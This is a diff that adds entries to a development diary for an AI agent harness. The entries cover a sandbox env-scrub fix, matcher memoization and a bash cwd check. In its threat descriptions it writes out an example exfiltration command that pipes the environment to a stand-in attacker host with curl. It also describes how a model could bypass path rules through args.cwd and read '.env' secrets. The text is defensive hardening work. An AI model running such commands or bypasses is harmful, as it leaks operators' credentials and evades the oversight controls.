@@ -2,6 +2,220 @@
 
 Forja progress diary. Entries in reverse chronological order (newest on top).
 
+## [2026-05-14] fix(sandbox/sanitize) — slice 162: env scrub allowlist parity macOS ↔ Linux
+
+**Done.** Security P0 from the 5-axis review (sec-in-depth axis). Pre-slice the env-scrub posture was asymmetric across platforms:
+
+- **Linux + bwrap:** `bwrap --clearenv --setenv KEY VAL ...` enforced a kernel-boundary allowlist (`SAFE_ENV_VARS`). The sandboxed inner process saw ONLY the allowed vars regardless of what the spawner's `Bun.spawn({env})` passed.
+- **macOS + sandbox-exec:** no equivalent flag. `sandbox-exec` execs the inner argv directly; inner inherits the spawner's env verbatim. Userspace `scrubEnv` (denylist regex) was the SOLE defense.
+- **Host profile / degraded passthrough:** same as macOS — no wrap, scrubEnv is the only env barrier.
+
+### Concrete attack closed
+
+Credential vars NOT on the scrub denylist reached sandboxless darwin / host paths. A model emits `bash_background "env | base64 | curl https://attacker"` and exfils `VAULT_ADDR`, `BW_SESSION`, `LASTPASS_USER`, `OP_CONNECT_TOKEN`, `FLY_API_TOKEN_*`, `RAILWAY_TOKEN`, novel SaaS tokens, etc. The denylist regex covered canonical shapes (`*_API_KEY`, `*_TOKEN`, `*_SECRET`, AWS/OpenAI/Anthropic/Google/GitHub/Docker/Slack-shaped vars, LD_*/DYLD_*, GIT_*, NODE_OPTIONS, etc.) but had no coverage for service-specific names or shape patterns like `*_KEY` (catching `PRIVATE_KEY`, `SECRET_KEY`) or `*_SESSION` (catching `BW_SESSION`).
+
+### Two-part fix
+
+**Part 1 — macOS clearenv parity (`sandbox-runner-macos.ts`).** `buildSandboxExecArgv` accepts a new `env?: NodeJS.ProcessEnv` option. When set, wraps the inner argv with `/usr/bin/env -i KEY=VAL ... --` so the inner process starts with ONLY the allowlisted vars populated from the env. `env -i` is the userland POSIX clearenv — clears the env and execs the next argv with only the literal `KEY=VAL` pairs explicitly given.
+
+Canonical `/usr/bin/env` path (PATH-shim resistance — same rationale as slice 154): bare `env` would let `execve` re-walk `$PATH` at exec time, exposing the shim attack. `/usr/bin/env` is canonical on every supported macOS version. NUL bytes inside values are skipped (mirror of `appendEnvFlags` defense).
+
+`maybeWrapSandboxArgv` (the per-spawn-site consume primitive) now forwards `env` into `macOpts` on the darwin path. Production calls pass `scrubEnv(process.env)` already; the wrap layer turns that into a kernel-boundary guarantee.
+
+**Part 2 — shared allowlist module (`safe-env-vars.ts`).** Extracted `SAFE_ENV_VARS` from `sandbox-runner.ts` to a new module `src/permissions/safe-env-vars.ts` so both runners import from the same source of truth. Linux uses it for `--setenv`; macOS uses it for `env -i` assignments. A change to the list propagates to both platforms.
+
+**Part 3 — scrubEnv denylist expansion (`sanitize/env.ts`).** Complements parts 1+2 for paths where the sandbox wrap doesn't fire (host profile, degraded passthrough). New patterns:
+
+- Shape suffixes: `*_KEY` (catches `PRIVATE_KEY`, `SECRET_KEY`, `ENCRYPTION_KEY`), `*_AUTH`, `*_BEARER`, `*_CRED` / `*_CREDS`, `*_SESSION`, `*_COOKIE`, `*_PRIVATE_KEY` (explicit, also caught by `_KEY`).
+- Service prefixes: `VAULT_` (HashiCorp), `BW_` (Bitwarden), `LPASS_` / `LASTPASS_` (LastPass), `OP_CONNECT_` (1Password Connect).
+- Specific names: `DOPPLER_TOKEN`, `INFISICAL_TOKEN`, `TWILIO_ACCOUNT_SID` (Twilio account SID is half the auth pair; the auth_token half is already caught by `_TOKEN`).
+
+The expansion is purely additive — drops more vars, never restores any. Regression-tested with common dev/locale/runtime vars (`PATH`, `HOME`, `EDITOR`, `CI`, `NODE_ENV`, `RUST_LOG`, `CARGO_HOME`, `GOPATH`, `JAVA_HOME`, etc.) all still pass through.
+
+### Defense layering after slice 162
+
+| Path | Layer 1 (userspace) | Layer 2 (kernel) |
+|---|---|---|
+| **Linux + bwrap profile** | `scrubEnv(process.env)` denylist | `bwrap --clearenv --setenv KEY VAL` allowlist |
+| **macOS + sandbox-exec** | `scrubEnv(process.env)` denylist | `/usr/bin/env -i KEY=VAL ... --` allowlist (slice 162) |
+| **host profile** | `scrubEnv(process.env)` denylist (expanded slice 162) | (no wrap by design — operator-opted host pass-through) |
+| **degraded (no sandbox tool)** | `scrubEnv(process.env)` denylist (expanded slice 162) | (no wrap available) |
+
+For sandboxed paths the layers compose: userspace scrub drops the canonical credential patterns; kernel-boundary allowlist drops everything else. A novel SaaS token added next year escapes the denylist but the allowlist drops it anyway.
+
+For unsandboxed paths (`host` / degraded) only Layer 1 fires — the expanded denylist closes the most common gaps without breaking legitimate dev env vars.
+
+### Why no full allowlist switch on `scrubEnv`
+
+Considered + rejected. A pure allowlist on `scrubEnv` would drop ANY var not on a short safe list — that breaks countless legitimate dev workflows (`NODE_ENV`, `RUST_LOG`, `CARGO_HOME`, custom CI vars, build flags). Operators would hit drop-surprise without an escape hatch.
+
+The hybrid posture (denylist expansion + kernel-boundary allowlist via sandbox wrap) closes the security gap without disrupting operator workflows. A future slice can add a policy-driven escape hatch (`tools.bash.passthrough_env: ['MY_VAR']`) if needed; the threat is closed without it.
+
+### Fixes
+
+| # | File | Change |
+|---|---|---|
+| **shared allowlist** | `src/permissions/safe-env-vars.ts` (new) | Exports `SANDBOX_SAFE_ENV_VARS`. Membership rules documented in-file. |
+| **Linux runner** | `src/permissions/sandbox-runner.ts` | Imports `SANDBOX_SAFE_ENV_VARS` from the new module; removes inline list. `MaybeWrapSandboxArgvOptions.env` docstring updated to reflect macOS coverage. |
+| **macOS runner** | `src/permissions/sandbox-runner-macos.ts` | New `env?: NodeJS.ProcessEnv` on `BuildSandboxExecArgvOptions`. When set, wraps inner argv with `/usr/bin/env -i KEY=VAL ... --`. `maybeWrapSandboxArgv` darwin path forwards env. NUL-safe (skips values with `\0`). PATH-shim resistant (canonical `/usr/bin/env`). |
+| **scrubEnv expansion** | `src/sanitize/env.ts` | New suffix patterns (`_KEY` / `_AUTH` / `_BEARER` / `_CRED(S)?` / `_SESSION` / `_COOKIE` / `_PRIVATE_KEY`) + service prefixes (`VAULT_` / `BW_` / `LPASS_` / `LASTPASS_` / `OP_CONNECT_`) + specific names (`DOPPLER_TOKEN`, `INFISICAL_TOKEN`, `TWILIO_ACCOUNT_SID`). |
+| **spec** | `docs/spec/PERMISSION_ENGINE.md §6.5` | New "Env-scrub kernel-boundary parity" subsection documenting the asymmetry, the fix, and the two-part defense (sandbox-side + scrubEnv-side). |
+
+### Tests added (+11)
+
+| File | Coverage |
+|---|---|
+| **`tests/permissions/sandbox-runner.test.ts` (1 updated)** | "darwin + sandbox-exec available" test rewritten to assert the new `env -i` wrap shape: `argv[3]='/usr/bin/env'`, `argv[4]='-i'`, env assignments between, `--` separator, then original inner argv. Verifies that `UNSAFE_TOKEN` from the env is NOT forwarded (regression against the threat). |
+| **`tests/sanitize/env.test.ts` (+10)** | `*_KEY` suffix catches PRIVATE_KEY/SECRET_KEY/ENCRYPTION_KEY/API_KEY. `*_AUTH` / `*_BEARER` / `*_CRED` / `*_CREDS` / `*_SESSION` / `*_COOKIE` suffixes drop. `VAULT_` / `BW_` / `LPASS_` / `LASTPASS_` / `OP_CONNECT_` prefixes drop. `DOPPLER_TOKEN` / `INFISICAL_TOKEN` / `TWILIO_ACCOUNT_SID` drop. Case-insensitive matching where applicable (`vault_token`, `lastpass_USER`, `Bw_Session`). Regression: dev/locale vars (`PATH`, `HOME`, `EDITOR`, `CI`, `NODE_ENV`, `RUST_LOG`, `CARGO_HOME`, `GOPATH`, `JAVA_HOME`, `MY_TOKENIZER_PATH`, `OAUTH_REDIRECT_URI`) all still pass through. |
+
+### Verification
+
+- `bun run typecheck` — clean
+- `bun run lint` — 0 errors / 2 pre-existing warnings
+- `bun test` — **7063 pass / 10 skip / 0 fail** (was 7053 → +10 net new; 1 existing test updated for the new wrap shape; zero regression)
+
+### Bash-tools / 5-axis review status
+
+Closes finding #4 (Security in-depth P0) from the 5-axis review. All 5 P0 findings (slice 158 sealing crash, slice 159 sensitive-paths wire, slice 160 bash args.cwd bypass, slice 161 hot-path memoization, slice 162 env scrub parity) now closed.
+
+Remaining: slice 163+ (P1 batches A-F per the planning task; can be picked up in any order).
+
+---
+
+## [2026-05-13] perf(permission-engine) — slice 161: matchPath realpath storm + Glob/RegExp churn (hot-path memoization)
+
+**Done.** Performance P0 from the 5-axis code review. The permission engine's matcher (`src/permissions/matcher.ts`) sits in the per-tool-call hot path. Pre-slice three issues compounded against the spec budget (5ms target / 15ms p95 per `PERFORMANCE.md`):
+
+1. **Glob/RegExp constructed per call.** `new Glob(pattern)` (path matcher) and `new RegExp(...)` (command/host matcher via `compileGlobToRegex`) ran on every invocation. For a 10-rule policy and one fs check, that's 10×2 Glob constructions; for one bash check, 10 RegExp compilations.
+2. **Realpath storm.** `matchPath` called `realpathSync(target)` ITSELF, so `firstMatchingPath` looping over N rules re-realpathed the SAME target N times. On hot FS or large rule lists this dominated the call.
+3. **Protected-paths resolve churn.** `classifyProtectedPath` recomputed `resolve(home, file)` (×6) and `resolve(cwd, dir)` (×3) inside hot loops on every call, even though `home` is frozen at SessionStart and `cwd` is also frozen per spec §4.3.
+
+### Fixes
+
+**Pattern caches (matcher.ts).** Three module-level Maps:
+- `globCache: Map<string, Glob>` keyed by literal pattern string (path matcher). The resolved-relative or absolute form used inside `matchPathPrepared` doubles as the key — same pattern × same cwd produces the same key, retained across calls.
+- `commandRegexCache: Map<string, RegExp>` keyed by raw command pattern. `compileGlobToRegex` runs once per distinct policy pattern.
+- `hostRegexCache: Map<string, RegExp>` keyed by lower-cased host pattern. Separated from command cache so case-insensitive entries don't burn duplicate slots.
+
+Cache bounds: union of distinct pattern strings the process ever sees. Realistic ceiling tens to low-hundreds of entries for typical policies; no eviction needed. Slice 159 already used the same pattern for the §8.4 sensitive-paths matcher; this slice generalizes to the broader matcher.
+
+**Prepared target API (matcher.ts).** New `prepareTarget(target, cwd) → PreparedPathTarget` shape that carries the realpath-resolved absolute + the resolved absolute cwd. `matchPathPrepared(pattern, prepared)` consumes the prepared form WITHOUT re-realpathing. `firstMatchingPath` calls `prepareTarget` ONCE at the top, then iterates patterns against the same prepared instance — N realpaths → 1.
+
+The original `matchPath(pattern, target, cwd)` stays as a public wrapper for callers that don't have a hot loop (tests, isolated uses); production fs decision paths go through `firstMatchingPath` directly, which now hoists the prepare step.
+
+**Protected-paths memoization (protected_paths.ts).** New module-level `targetCache: Map<string, ResolvedProtectedTargets>` keyed by `${home}\0${cwd}` (NUL-separated to avoid collision when one string ends with the other). `classifyProtectedPath` reads the cached resolved tilde + cwd target lists instead of recomputing on each call. Constant roots (`SYSTEM_DENY_ROOTS`, `ABSOLUTE_ESCALATE_ROOTS`) need no per-call resolve — they're declared once at module load.
+
+Cache bound: distinct (home, cwd) tuples the process sees. Typical agent session = 1 entry. Tests bootstrapping many engines = tens.
+
+### Why three caches, not one
+
+Pattern compilation, target resolution, and protected-path resolution are three independent dimensions:
+
+- Pattern compilation depends ONLY on the literal pattern string.
+- Target resolution depends on (target, cwd) — different cwds need different prepared targets.
+- Protected-path resolution depends on (home, cwd) — orthogonal to both.
+
+Sharing one cache would conflate the keys and cause stale-cache bugs when one dimension changes but others don't. Three caches keep the invariants local.
+
+### Functional semantics unchanged
+
+The slice is purely a memoization refactor. Every public function (`matchPath`, `firstMatchingPath`, `matchCommand`, `matchHost`, `classifyProtectedPath`) has the same input→output relation as pre-slice. The full test suite (7053 tests across 311 files) is the regression check; the 6 new tests pin the new public API (`matchPathPrepared`, `prepareTarget`) and cache stability across repeated calls.
+
+### Fixes
+
+| # | File | Change |
+|---|---|---|
+| **matcher caches** | `src/permissions/matcher.ts` | New `globCache`, `commandRegexCache`, `hostRegexCache` module-level Maps. `getGlob` / `getCommandRegex` / `getHostRegex` helpers route through the caches. |
+| **prepared target** | `src/permissions/matcher.ts` | New `PreparedPathTarget` interface, `prepareTarget(target, cwd)` factory, `matchPathPrepared(pattern, prepared)` matcher. `matchPath` becomes a thin wrapper around them; `firstMatchingPath` hoists `prepareTarget` to top-of-loop. |
+| **protected_paths cache** | `src/permissions/protected_paths.ts` | New `targetCache: Map<string, ResolvedProtectedTargets>` + `getResolvedTargets(home, cwd)` helper. `classifyProtectedPath` reads cached resolved tilde + cwd lists instead of recomputing per call. |
+
+### Tests added (+6)
+
+| Test | Coverage |
+|---|---|
+| **`matchPathPrepared` returns the same result as `matchPath`** | Semantic equivalence across 6 representative cases (subdir, sibling, glob, absolute, nested, exact). Pinned so a future refactor can't drift the two APIs apart. |
+| **`prepareTarget` result is stable across calls** | Idempotent factory — same input produces equal `absTarget` / `absCwd`. |
+| **`firstMatchingPath` repeated identical calls stay deterministic** | 100× same call returns the same match (no cache-poisoning where a stale Glob produces wrong verdict). |
+| **`firstMatchingPath` rapidly alternating cwd/pattern keeps correctness** | Cross-cwd cases don't bleed (different cwds produce different resolved keys). |
+| **`matchCommand` cache stable across repeated invocations** | 100× same pattern call produces stable result; same pattern doesn't recompile and doesn't drift. |
+| **`matchHost` case-insensitive cache stable** | Lower-cased key works across mixed-case inputs. |
+
+### Verification
+
+- `bun run typecheck` — clean
+- `bun run lint` — 0 errors / 2 pre-existing warnings
+- `bun test` — **7053 pass / 10 skip / 0 fail** (was 7047 → +6 net new; zero regression)
+
+### Bash-tools / 5-axis review status
+
+Closes finding #5 (Performance P0) from the 5-axis review. Slice 159's sensitive-paths matcher already had its own local cache; this slice generalizes the pattern to the broader matcher and adds the prepared-target API so realpath fires once per check instead of once per pattern.
+
+Pending: slice 162 (env scrub allowlist, security P0), slice 163+ P1 batches.
+
+---
+
+## [2026-05-13] fix(tools/bash) — slice 160: bash args.cwd bypass of path-allow rules
+
+**Done.** Third P0 from the 5-axis code review (threat-model axis). The bash family (`bash`, `bash_background`) accepted any `args.cwd` — relative or absolute — and resolved it against the session cwd OR used it verbatim when absolute. The permission engine's bash resolver, however, attributes capabilities against `ctx.cwd` (the SESSION cwd, frozen at SessionStart). Result: the engine's capability accounting diverged from the actual exec dir.
+
+### Concrete attack closed
+
+Model emits `bash {command:"cat foo.txt", cwd:"/etc"}`. Resolver attributes `read-fs:<session_cwd>/foo.txt`. Operator's `allow_paths: ['project/**']` rule passes the engine because the engine sees `read-fs:<project>/foo.txt`. Broker's `resolvePath(baseCwd, '/etc')` honors the absolute path, so bash actually reads `/etc/foo.txt`. The engine never saw `/etc/...` in any capability; the audit row records the wrong path; the policy authorized something it didn't intend. Zero existing tests covered `args.cwd ≠ ctx.cwd`.
+
+### Fix: refuse args.cwd outside session subtree (Fix A from review)
+
+Two options surfaced during planning:
+
+- **Fix A (chosen):** the bash tool handler refuses `args.cwd` outside session subtree at the boundary BEFORE constructing BrokerRequest. Operators who need a different cwd `cd` inside the command (resolver sees the command text and emits caps for the cd target).
+- **Fix B (rejected):** pass `args.cwd` into the resolver context so capability attribution reflects the actual exec dir. Larger surface — every resolver branch would need an effective-cwd parameter, and the threat is closed without it.
+
+Implemented as a shared helper `src/tools/builtin/_bash-cwd.ts` consumed by both `bash` and `bash_background`. The helper:
+
+1. Resolves the proposed cwd (absolute → literal; relative → joined with session cwd).
+2. Canonicalizes both sides via `realpath` (defeats symlink-to-outside escapes — `/work/proj/link → /etc` is caught).
+3. Subtree check via `node:path.relative`: empty string means equal (OK), `..`-prefixed or absolute (different roots) means outside (refuse).
+4. Falls back to literal-compare on `realpath` failure (ENOENT/ELOOP/EACCES on ancestors) so a non-existent proposed path still gets the subtree check; spawn-fail is the operator signal if the literal also escapes.
+
+Refuse returns `tool.invalid_arg` with a message naming the CANONICAL resolved path, not the misleading symlink path the model supplied. Operator sees the actual target in the audit.
+
+### Defense layering vs slice 155
+
+Slice 155 added `realpath()` canonicalization inside the SANDBOX RUNNER (`buildBwrapArgv` / `buildSandboxExecArgv`) — protects the wrap layer post-engine. Slice 160 adds canonicalization + subtree check at the TOOL HANDLER ENTRY — protects pre-engine. The two layers close different points of symlink-escape in the bash flow:
+
+- Slice 155 catches a symlink in `ctx.cwd` itself (operator-supplied cwd resolves to a hidden dir).
+- Slice 160 catches a symlink in `args.cwd` (model-supplied cwd resolves outside session).
+
+Either layer alone is insufficient: slice 155 doesn't see `args.cwd`; slice 160 doesn't run when `args.cwd === undefined`.
+
+### Fixes
+
+| # | File | Change |
+|---|---|---|
+| **new helper** | `src/tools/builtin/_bash-cwd.ts` | `resolveAndValidateBashCwd({argsCwd, sessionCwd, realpath?})` returns `{ok:true, cwd}` or `{ok:false, error}`. Canonicalizes via realpath; subtree-checks via `node:path.relative`; falls back to literal on realpath failure. |
+| **bash tool** | `src/tools/builtin/bash.ts` | Replaces inline `isAbsolute(args.cwd) ? args.cwd : resolvePath(ctx.cwd, args.cwd)` with helper call; refuse → `tool.invalid_arg`. |
+| **bash_background tool** | `src/tools/builtin/bash-background.ts` | Same swap; identical refuse contract so the bg path closes the same vector. |
+| **spec** | `docs/spec/PERMISSION_ENGINE.md §4.3` | New "`args.cwd` em bash family (slice 160)" subsection documenting threat, fix, defense layering with slice 155. |
+
+### Tests added (+16)
+
+| File | Coverage |
+|---|---|
+| **`tests/tools/_bash-cwd.test.ts` (new, 13 tests)** | Each helper branch: undefined argsCwd → session; relative subdir → allowed; absolute inside → allowed; equal-to-session → allowed; absolute outside → refuse with canonical message; `..` escape → refuse; multi-segment `..` → refuse; symlink inside → canonical allowed; symlink ESCAPING → refuse with canonical target in error; realpath ENOENT on proposed → fall back to resolved; realpath ENOENT + escape → still refuses; realpath ENOENT on BOTH sides → literal-compare still sane; darwin firmlink-style root mismatch → refuse. |
+| **`tests/tools/bash-broker.test.ts` (+2)** | "absolute args.cwd outside session subtree refuses (slice 160)" + "absolute args.cwd INSIDE session subtree is passed through unchanged" (replaces the pre-slice "passed through unchanged" test that covered the bypass case). |
+| **`tests/tools/bash-background.test.ts` (+1, +1 updated)** | "absolute cwd inside session subtree" replaces "absolute cwd is used as-is" (the pre-slice attack-vector test). New test: "absolute cwd OUTSIDE session subtree refuses with tool.invalid_arg". |
+
+### Verification
+
+- `bun run typecheck` — clean
+- `bun run lint` — 0 errors / 2 pre-existing warnings
+- `bun test` — **7047 pass / 10 skip / 0 fail** (was 7022 → +25 net new + 2 existing updated; zero regression)
+
+### Bash-tools / 5-axis review status
+
+This closes finding #2 (threat-model P0) from the 5-axis review. Pending: slice 161 (matchPath realpath storm, performance P0), slice 162 (env scrub allowlist, security P0), slice 163+ P1 batches.
+
+---
+
 ## [2026-05-13] fix(permission-engine) — slice 159: wire SEC §8.4 sensitive-paths deny-list into fs tools
 
 **Done.** Second P0 from the 5-axis code review (cross-confirmed by both the security-in-depth and threat-model agents). Pre-slice the canonical `SENSITIVE_PATH_DENY_LIST` patterns (defined in `src/subagents/sensitive-paths.ts` per SECURITY_GUIDELINE.md §8.4) were enforced ONLY by the subagent worktree pre-spawn filter. The runtime fs tools (`read_file`, `write_file`, `edit_file`, `grep`, `glob`) bypassed them entirely. Concrete attack: model emits `read_file('.env')` against an operator policy with `allow_paths: ['**']` (the most common "let it work" config) — request authorized end-to-end, secrets land in `tool_calls.output` which is persisted to the DB. SEC §8.4 explicitly says "Por que isso não vira redaction: checkpoint precisa conteúdo literal" — refuse is the only correct posture, not redaction.
